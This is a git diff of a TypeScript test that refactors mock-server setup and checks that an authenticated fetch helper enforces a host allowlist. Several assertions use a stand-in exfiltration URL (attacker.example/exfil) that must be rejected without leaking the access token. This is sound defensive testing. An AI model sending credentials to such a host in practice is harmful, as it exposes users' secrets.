@@ -8,7 +8,7 @@ import {
 	createAuthenticatedFetch,
 } from './codemode-utils.ts'
 import { assertIntegrationHostAllowed } from './integration-host-allowlist.ts'
-import { withMswNodeServer } from '#worker/test-support/msw-node-server.ts'
+import { createMswNodeServer } from '#worker/test-support/msw-node-server.ts'
 
 type SecretSetCall = {
 	name: string
@@ -78,49 +78,43 @@ test('createAuthenticatedFetch enforces integration host allowlists and fails cl
 	const { codemode } = createCodemode()
 	const fetchCalls: Array<Request> = []
 
-	await withMswNodeServer(createSpotifyHandlers(fetchCalls), async () => {
-		const authenticatedFetch = await createAuthenticatedFetch(
-			codemode,
-			'spotify',
-		)
+	using _server = createMswNodeServer(createSpotifyHandlers(fetchCalls))
+	const authenticatedFetch = await createAuthenticatedFetch(codemode, 'spotify')
 
-		const fetchCallsAfterSetup = fetchCalls.length
+	const fetchCallsAfterSetup = fetchCalls.length
 
-		await expect(
-			authenticatedFetch('https://attacker.example/exfil'),
-		).rejects.toThrow(IntegrationHostNotAllowedError)
-		expect(fetchCalls.length).toBe(fetchCallsAfterSetup)
+	await expect(
+		authenticatedFetch('https://attacker.example/exfil'),
+	).rejects.toThrow(IntegrationHostNotAllowedError)
+	expect(fetchCalls.length).toBe(fetchCallsAfterSetup)
 
-		let disallowedError: Error | null = null
-		try {
-			await authenticatedFetch('https://attacker.example/exfil')
-		} catch (error) {
-			disallowedError = error as Error
-		}
-		expect(disallowedError).toBeInstanceOf(IntegrationHostNotAllowedError)
-		expect(disallowedError!.message).not.toContain(fakeAccessToken)
-		expect(JSON.stringify(disallowedError)).not.toContain(fakeAccessToken)
+	let disallowedError: Error | null = null
+	try {
+		await authenticatedFetch('https://attacker.example/exfil')
+	} catch (error) {
+		disallowedError = error as Error
+	}
+	expect(disallowedError).toBeInstanceOf(IntegrationHostNotAllowedError)
+	expect(disallowedError!.message).not.toContain(fakeAccessToken)
+	expect(JSON.stringify(disallowedError)).not.toContain(fakeAccessToken)
 
-		const apiResponse = await authenticatedFetch(
-			'https://api.spotify.com/v1/me',
-		)
-		expect(apiResponse.status).toBe(200)
-		const apiCall = fetchCalls[fetchCalls.length - 1]!
-		expect(apiCall.url).toBe('https://api.spotify.com/v1/me')
-		expect(apiCall.headers.get('authorization')).toBe(
-			spotifyAccessTokenPlaceholder,
-		)
+	const apiResponse = await authenticatedFetch('https://api.spotify.com/v1/me')
+	expect(apiResponse.status).toBe(200)
+	const apiCall = fetchCalls[fetchCalls.length - 1]!
+	expect(apiCall.url).toBe('https://api.spotify.com/v1/me')
+	expect(apiCall.headers.get('authorization')).toBe(
+		spotifyAccessTokenPlaceholder,
+	)
 
-		const cdnResponse = await authenticatedFetch(
-			'https://cdn.spotify.com/images/cover.jpg',
-		)
-		expect(cdnResponse.status).toBe(200)
-		const cdnCall = fetchCalls[fetchCalls.length - 1]!
-		expect(cdnCall.url).toBe('https://cdn.spotify.com/images/cover.jpg')
-		expect(cdnCall.headers.get('authorization')).toBe(
-			spotifyAccessTokenPlaceholder,
-		)
-	})
+	const cdnResponse = await authenticatedFetch(
+		'https://cdn.spotify.com/images/cover.jpg',
+	)
+	expect(cdnResponse.status).toBe(200)
+	const cdnCall = fetchCalls[fetchCalls.length - 1]!
+	expect(cdnCall.url).toBe('https://cdn.spotify.com/images/cover.jpg')
+	expect(cdnCall.headers.get('authorization')).toBe(
+		spotifyAccessTokenPlaceholder,
+	)
 
 	expect(() =>
 		assertIntegrationHostAllowed(
@@ -152,26 +146,22 @@ test('createAuthenticatedFetch enforces integration host allowlists and fails cl
 	} satisfies CodemodeNamespace
 
 	const emptyAllowlistFetchCalls: Array<Request> = []
-	await withMswNodeServer(
-		[
-			http.post(emptyIntegration.tokenUrl, () =>
-				HttpResponse.json({ access_token: fakeAccessToken }),
-			),
-			http.get('https://anything.example/data', async ({ request }) => {
-				emptyAllowlistFetchCalls.push(request.clone())
-				return HttpResponse.json({ ok: true })
-			}),
-		],
-		async () => {
-			const emptyAllowlistFetch = await createAuthenticatedFetch(
-				emptyAllowlistCodemode,
-				'spotify',
-			)
-			const fetchCallsBefore = emptyAllowlistFetchCalls.length
-			await expect(
-				emptyAllowlistFetch('https://anything.example/data'),
-			).rejects.toThrow(/no allowed hosts configured/)
-			expect(emptyAllowlistFetchCalls.length).toBe(fetchCallsBefore)
-		},
+	using _emptyAllowlistServer = createMswNodeServer([
+		http.post(emptyIntegration.tokenUrl, () =>
+			HttpResponse.json({ access_token: fakeAccessToken }),
+		),
+		http.get('https://anything.example/data', async ({ request }) => {
+			emptyAllowlistFetchCalls.push(request.clone())
+			return HttpResponse.json({ ok: true })
+		}),
+	])
+	const emptyAllowlistFetch = await createAuthenticatedFetch(
+		emptyAllowlistCodemode,
+		'spotify',
 	)
+	const fetchCallsBefore = emptyAllowlistFetchCalls.length
+	await expect(
+		emptyAllowlistFetch('https://anything.example/data'),
+	).rejects.toThrow(/no allowed hosts configured/)
+	expect(emptyAllowlistFetchCalls.length).toBe(fetchCallsBefore)
 })
